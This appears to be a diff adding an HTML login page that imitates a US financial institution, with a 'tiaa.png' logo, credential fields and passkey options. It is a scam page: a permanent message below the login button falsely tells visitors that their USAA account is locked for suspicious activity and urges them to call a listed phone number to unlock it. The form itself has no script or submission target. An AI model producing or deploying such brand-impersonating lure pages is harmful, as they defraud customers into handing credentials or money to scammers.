@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Login - Your Website</title>
+  <style>
+    html {
+      font-size: 18px;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+    }
+
+    header {
+      background-color: white;
+      border-bottom: 1px solid #eee;
+      padding: 15px 30px;
+      display: flex;
+      align-items: center;
+    }
+
+    .logo {
+      height: 32px;
+    }
+
+    .container {
+      max-width: 340px;
+      margin: 60px auto;
+      padding: 25px;
+      border: 1px solid #eee;
+      box-shadow: 0 0 8px rgba(0, 0, 0, 0.03);
+    }
+
+    h2 {
+      font-size: 1.8rem;
+      color: #001f5c;
+      margin-bottom: 25px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: bold;
+      font-size: 1rem;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      box-sizing: border-box;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+    }
+
+    .remember {
+      display: flex;
+      align-items: center;
+      margin-bottom: 15px;
+      font-size: 0.95rem;
+    }
+
+    .remember input {
+      margin-right: 6px;
+    }
+
+    .btn-primary {
+      background-color: #2a4fff;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 1rem;
+    }
+
+    .btn-primary:hover {
+      background-color: #1e39c1;
+    }
+
+    .login-message {
+      margin-top: 15px;
+      color: red;
+      font-weight: bold;
+      text-align: center;
+    }
+
+    .links {
+      margin-top: 12px;
+    }
+
+    .links a {
+      color: #2a4fff;
+      text-decoration: none;
+      display: block;
+      margin-bottom: 5px;
+      font-size: 0.95rem;
+      font-weight: bold;
+    }
+
+    .passkey-box {
+      margin-top: 30px;
+      padding: 18px;
+      background-color: #f8f8f8;
+      border-radius: 6px;
+    }
+
+    .btn-passkey {
+      background-color: #2a4fff;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      font-weight: bold;
+      border-radius: 6px;
+      margin-bottom: 10px;
+      cursor: pointer;
+      font-size: 1rem;
+    }
+
+    .passkey-box p {
+      font-size: 0.85rem;
+      margin: 0;
+      margin-top: 5px;
+    }
+
+    .passkey-box a {
+      display: inline-block;
+      margin-top: 5px;
+      font-size: 0.9rem;
+      color: #2a4fff;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .footer {
+      margin-top: 25px;
+      text-align: center;
+    }
+
+    .footer a {
+      color: #2a4fff;
+      text-decoration: none;
+      font-weight: bold;
+      border: 1.5px solid #2a4fff;
+      padding: 10px 20px;
+      border-radius: 6px;
+      display: inline-block;
+      font-size: 0.95rem;
+    }
+
+    @media (max-width: 480px) {
+      html {
+        font-size: 16px;
+      }
+
+      .container {
+        margin: 30px 15px;
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header with Logo -->
+  <header>
+    <img src="tiaa.png" alt="Your Logo" class="logo">
+  </header>
+
+  <!-- Login Form Container -->
+  <div class="container">
+    <h2>Log in to your account</h2>
+    <form id="loginForm">
+      <label for="userID">User ID</label>
+      <input type="text" id="userID" name="userID" required>
+
+      <label for="password">Password</label>
+      <input type="password" id="password" name="password" required>
+
+      <div class="remember">
+        <input type="checkbox" id="rememberMe">
+        <label for="rememberMe">Remember me</label>
+      </div>
+
+      <button type="submit" class="btn-primary">Log in with password</button>
+
+      <!-- Permanent message below the login button -->
+      <div class="login-message">
+        We have temporarily disabled your usaa account access due to multiple suspicious sign-in attempts. Contact our customer service team now @ +1-808-556-3576 to verify & unlock your account!
+      </div>
+
+      <div class="links">
+        <a href="#">Forgot user ID</a>
+        <a href="#">Forgot password</a>
+      </div>
+
+      <div class="passkey-box">
+        <strong>Use a passkey instead</strong>
+        <button type="button" class="btn-passkey">Log in with passkey</button>
+        <p>Passkeys are currently not available for Business Edge users and Financial Advisors.</p>
+        <a href="#">What is a passkey?</a>
+      </div>
+    </form>
+
+    <div class="footer">
+      <a href="#">Need online access?</a>
+    </div>
+  </div>
+
+</body>
+</html>
